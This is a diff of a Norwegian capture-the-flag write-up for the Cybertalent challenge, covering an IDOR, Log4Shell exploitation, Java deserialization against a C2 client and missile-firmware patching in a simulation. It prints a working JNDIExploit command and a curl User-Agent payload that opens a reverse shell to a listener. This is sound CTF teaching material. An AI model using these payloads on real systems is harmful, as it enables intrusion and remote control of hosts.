@@ -7,7 +7,7 @@ Cybertalent er
 
 ## 2_01 - pcap_fil
 
-Når vi åpner PCAP-filen så er det en HTTP pakke som skiller seg ut:
+Når vi åpner PCAP-filen i Wireshark er det en HTTP pakke som skiller seg ut:
 
 ```text
 GET / HTTP/1.1
@@ -34,6 +34,8 @@ Gratulerer, korrekt svar!
 
 INTREP gir oss en pekepinne mot en nettside som kan nås på ANVILNOTES.CYBERTALENT.NO.
 Dette er tilsynelatende en helt vanlig nettside hvor man kan lage bruker, logge inn og lagre notater i skyen.
+
+Om vi lager en testbruker og lager et notat, så kan vi se at hvert notat får en mangesifret unik ID. Vi kan logge ut og fortsatt kunne lese notatet så lenge vi har ID'en. Utifra dette begynte jeg å se etter "Insecure direct object references" (IDOR), og kom frem til at https://anvilnotes.cybertalent.no/note/1 gir oss tilgang til et notat skrevet av admin. Dette notatet innholder et flagg, og hint om veien videre.
 
 ```text
 Kategori: 2. Oppdrag
@@ -256,14 +258,17 @@ Nmap scan report for 0e7e17e3605aa2385b923dbd549531e4_pwr-ws-caf5db.1.4gpt2qoq7d
 Host is up (0.0076s latency).
 ```
 
-https://github.com/zzwlpx/JNDIExploit
-https://github.com/black9/Log4shell_JNDIExploit
+Da jeg tidligere har utnyttet Log4J så har jeg hatt best erfaring med [dette](https://github.com/zzwlpx/JNDIExploit) Github repositoret. `JNDIExploit.jar`-fila er ikke tilgjengelig der lengre, men kan finnes [her](https://github.com/black9/Log4shell_JNDIExploit).
+
+I angrepet vi observerte i pcap-fila var sårbarheten i User-Agent headeren. Utnyttelsen blir derfor slik:
 
 ```bash
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.0.69.36 &
 nc -lvnp 4444
-curl pwr-ws-caf5db -A '${jndi:ldap://10.0.69.36:1389/Basic/ReverseShell/10.0.69.36/4444}'
+curl pwr-ws-caf5db -A '${jndi:ldap://corax:1389/Basic/ReverseShell/10.0.69.36/4444}'
 ```
+
+Om alt gikk bra vil vi få et shell i terminalen vi kjørte `nc`, og flagget ligger godt synlig.
 
 ```text
 Kategori: 2. Oppdrag
@@ -282,7 +287,7 @@ Ny fil: /home/login/2_oppdrag/sshkey_pwr-ws-caf5db
 
 ## 2.07_shady-aggregator
 
-When listing the processes using `ps -aux`, we can see an active SSH connection:
+Om vi bruker `ps -aux` for å liste prosessene som kjører ser vi en aktiv SSH forbindelse:
 `user         428  0.0  0.0   9100  1616 ?        Ss    2022   0:00 ssh: /home/user/.ssh/cp/archive@shady-aggregator_`
 
 ```
@@ -310,7 +315,7 @@ Det burde være mulig å hoppe videre til de andre enhetene som kontrolleres.
 
 ## 2.08_client_list
 
-On `pwr-ws-caf5db` we could see that there was an active c2 running. Inspecting `/tmp/.tmp/`, we can see some files:
+`ps -aux` på `pwr-ws-caf5db` forteller oss at det er en aktiv c2 klient på maskinen. I mappen `/tmp/.tmp/` finner vi følgende filer:
 
 ```text
 -rw-r--r-- 1 user user 11258 Dec 18 22:02 .client
@@ -318,10 +323,11 @@ On `pwr-ws-caf5db` we could see that there was an active c2 running. Inspecting 
 -rw-r--r-- 1 user user    22 Jan  1 22:43 .output
 ```
 
-Running `strings /tmp/.tmp/.config` a suspicious looking URL:
+Om vi kjører `strings /tmp/.tmp/.config` får vi en suspekt URL:
 `http://shady-aggregator.utl/f52e6101/`
 
-When running a directory scan on the URL we can see that /list is valid.
+
+En rask rekognosering med kommandoen `gobuster dir -h http://shady-aggregator.utl/f52e6101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` sier oss at `/list` er en gyldig sti:
 
 ```
 curl http://shady-aggregator.utl/f52e6101/list
@@ -360,11 +366,11 @@ Den test-instansen som fortsatt sjekker inn så spennende ut...
 Nå har vi tilgang til både archive@shady-aggregator og kildekoden for skadevaren som er i bruk. Scoreboard-teksten til 2.08 hinter mot den test-3 instansen som sjekker inn hvert 10. sekund.
 
 Det mest logiske er at det er en sårbarhet i skadevaren som vil gi oss tilgang til de som opererer skadevaren.
-Dette fant jeg ikke med det første, så gravde meg ned i et kaninhull som endte med at jeg fikk tilgang til c2-brukeren på shady-aggregator, som var et flagg i umulig-kategorien. Det var gjennom en race condition, og gjennomgangen ligger [nederst](#3413_shady-aggregator_c2).
+Dette fant jeg ikke med det første, så gravde meg ned i et kaninhull som endte med at jeg fikk tilgang til c2-brukeren på shady-aggregator, som var et flagg i umulig-kategorien. Det var gjennom en race condition -> SSTI, og gjennomgangen ligger [nederst](#3413_shady-aggregator_c2).
 
-Men selv tilgang til brukeren som kjørte serveren var ikke det som måtte til får å få tilgang til skurkene. Hver en kommando som blir lastet opp og ned går gjennom ECDSA signatursjekk, og implementasjonen virket nokså plettfri både på serveren og klienten i mine øyne.
+Men selv tilgang til brukeren som kjørte serveren var ikke det som måtte til for å få tilgang til skurkene. Hver en kommando som blir lastet opp og ned går gjennom en ECDSA signatursjekk, og implementasjonen virket nokså plettfri både på serveren og klienten i mine øyne.
 
-Etter mye leting på nettet kom jeg over en sårbarhetskategori som heter Java Deserialization. Etter mange timers lesing gjennom slides og whitepapers på [denne](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#overview) GitHub'en så forstod litt hvordan sårbarheten fungerte, og hvordan den kunne anvendes i denne situasjonen.
+Etter mye leting på nettet kom jeg over en sårbarhetskategori som heter Java Deserialization. Etter mange timers lesing gjennom slides og whitepapers på [denne](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#overview) GitHub'en så forstod jeg litt hvordan sårbarheten fungerte, og hvordan den kunne anvendes i denne situasjonen.
 
 I Config.java er det en `readObject()` funksjon som håndterer hvordan et Config-objekt skal leses inn.
 I denne ser vi at den går gjennom alle `pendingCommands`, og kjører de hvis tiden er inne. Dette skjer da altså før noe som helst verifikasjon gjennom ECDSA.
@@ -396,8 +402,6 @@ Command c = (Command) in.readObject();
 
 Selv om det mottatte objektet blir kastet til et `Command` object, så vil `readObject()` bli eksekvert før dette.
 Det spiller da ingen rolle om denne kastingen feiler, vi bryr oss bare om `readObject()`.
-
-Java deserializing on the Config object equals RCE.
 
 ```text
 Kategori: 2. Oppdrag
@@ -436,7 +440,7 @@ Ny fil: /home/login/2_oppdrag/INTREP-2.txt
 
 ## 2.11_aurum_shell
 
-Vi bruker samme exploit som fra 2.09, men bytter ut ID'en til aurum sin.
+Vi bruker samme exploit som for 2.09, men bytter ut ID'en til aurum sin.
 Flagget ligger godt synlig i `/home/user/FLAG`.
 
 ```text
@@ -454,20 +458,19 @@ Ny fil: /home/login/2_oppdrag/sshkey_aurum
 
 ## 2.12_missile_targets
 
-En naturlig ting å gjøre i et nytt miljø er å sjekke hva som er blitt gjort før. Dette forteller `history`-kommandoen oss:
+En naturlig ting å gjøre i et nytt miljø er å sjekke hva som er blitt gjort før. Dette forteller `history` kommandoen oss:
 
 ```bash
-user@aurum:~$ history
-    1  ls -lah
-    2  which signer
-    3  signer --help
-    4  echo "Testing testing" > test.txt && signer --file-name test.txt --key-file privkey.pem --rng-source urandom
-    5  rm test.txt
-    6  konekt
-    7  signer --file-name missile.1.3.37.fw --key-file privkey.pem --rng-source urandom
-    8  mv missile.1.3.37.fw_signed missile.1.3.37.fw
-    9  konekt
-   10  rm privkey.pem missile.1.3.37.fw
+1  ls -lah
+2  which signer
+3  signer --help
+4  echo "Testing testing" > test.txt && signer --file-name test.txt --key-file privkey.pem --rng-source urandom
+5  rm test.txt
+6  konekt
+7  signer --file-name missile.1.3.37.fw --key-file privkey.pem --rng-source urandom
+8  mv missile.1.3.37.fw_signed missile.1.3.37.fw
+9  konekt
+10 rm privkey.pem missile.1.3.37.fw
 ```
 
 `signer` og `konekt` er ikke-standard kommandoer, og fortjener litt videre utforskning.
@@ -706,9 +709,8 @@ struct zsl_vec {
 typedef double zsl_real_t;
 ```
 
-
-
-Brukte python til å unpacke bytene til 3 doubles:
+Viser seg at `_target` er et array bestående av av 3 `zsl_real_t`, som er av datatypen `double`.
+Brukte python til å unpacke bytene:
 
 ```python
 import array
@@ -725,7 +727,7 @@ Det ga følgende output:
 
 Det ser akkurat ut som target-verdiene for SUB:1 MIS:1 som dukket opp i listen over missiler! Vi er på rett spor.
 
-Jeg brukte litt tid på å lese meg opp på koordinatsystemer for å finne ut hva disse tallene betydde, og kom frem til det var ECEF (Earth-centered, Earth-fixed) koordinater vi jobbet med.
+Jeg brukte litt tid på å lese meg opp på koordinatsystemer for å finne ut hva disse tallene betydde, og kom frem til det var ECEF (*Earth-centered, Earth-fixed*) koordinater vi jobbet med.
 For å dobbeltsjekke dette prøvde jeg å konvertere fra ECEF til lat/lon ved hjelp av konvertere på nett, men de ga et resultat som virket feil.
 
 Så da spørte jeg pent ChatGPT om å lage en til meg:
@@ -756,9 +758,8 @@ Output:
 
 Plugger vi disse koordinatene inn i [Google Maps](https://www.google.no/maps/place/51%C2%B030'35.5%22N+0%C2%B007'05.1%22W/@51.5098683,-0.120286,17z/data=!3m1!4b1!4m5!3m4!1s0x0:0xf5e2635478a5eaeb!8m2!3d51.509865!4d-0.118092) så havner vi midt i sentrum av London. Nice! 
 
-
-
-Jeg brukte [Nvector](https://github.com/pbrod/Nvector) for å gjøre de geometriske kalkulasjonene. Lagde dette for å gjøre om lat/lon koordinatene vi fikk om til ECEF, for så å pakke de til rett dataformat:
+Målet nå var å regne ut ECEF vektorene som tilsvarte lat/lon koordinatene vi fikk av oppdragsgiver.
+Jeg endte opp med å bruke [Nvector](https://github.com/pbrod/Nvector) for å gjøre de geometriske kalkulasjonene:
 
 ```python
 import nvector
@@ -789,13 +790,17 @@ Planen nå var å:
 * Lage shellcode som flashet ubåt 1 med vår nye firmware
 * Utføre en simulering, og se hva som skjer
 
+```bash
 
+```
 
+Missilet fløy i rett retning, men traff ikke målet. Jeg tenkte at dette var på grunn av at flytiden ikke stemte mtp. den lengre distansen missilet nå måtte fly.
 
+Jeg endret da én byte i `_tof`, slik at tallverdien ble på ~69000. Dette gjorde at simuleringen brukte 10 timer, og missilet traff fortsatt ikke.
 
+Prøvde å lese meg opp på rakettforskning og hvordan tid, fart og flybanen til ballistiske missiler regnes ut, men det var komplisert. Kom frem til at beste måten å løse problemet på var å "observere" hva flytiden burde være, i stedet for å kalkulere den ut. Jeg hadde jo tross alt tilgang til dataen til 80 missiler hvor dette allerede var kalkulert.
 
-
-å regne ut distansen mellom hver ubåt og dens respektive missilers mål.
+Jeg lagde da et [lite skript](missile_scripts/missile_data_fun.py) for å regne ut distansen mellom hver ubåt og dens respektive missilers mål, i tillegg til sammenhengen mellom distanse og flytiden:
 
 ```text
 Distance: 348395.48975179956 - Time of Flight: 500.0 - Distance/TOF: 696.7909795035991
@@ -893,9 +898,14 @@ Submarine 4 - Distance: 3509224.261450487 - Recommended _tof: 2300.0 (00f8a140)
 Submarine 5 - Distance: 3177066.054664542 - Recommended _tof: 2100.0 (0068a040)
 ```
 
-Hex-verdien i parantes er de rå bytene som _tof skal patches med.
+Hex-verdien i parantes er de rå bytene som `_tof` skal patches med.
 
+Jeg lagde da 5 firmwares, hvor alle hadde samme `_target`, men forskjellig `_tof`.
 
+```bash
+```
+
+Etter gode 2 ekte timer med simulering hadde alle 5 missilene ~~truffet~~ bommet, og 5 flagg hadde dukket opp.
 
 ```text
 Kategori: 2. Oppdrag
